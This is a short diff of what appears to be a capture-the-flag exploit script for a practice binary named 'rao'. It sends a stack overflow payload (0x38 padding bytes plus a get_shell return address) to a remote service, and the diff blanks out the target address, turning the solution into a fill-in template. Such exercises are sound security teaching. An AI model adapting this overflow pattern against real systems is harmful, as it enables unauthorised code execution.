@@ -5,7 +5,7 @@ port = 숫자
 #p = process("./rao")
 r = remote(url, port)
 
-get_shell = p64(0x4006aa)
+get_shell = 
 
 payload = b'a' * 0x38 + get_shell
 r.sendlineafter("Input", payload)
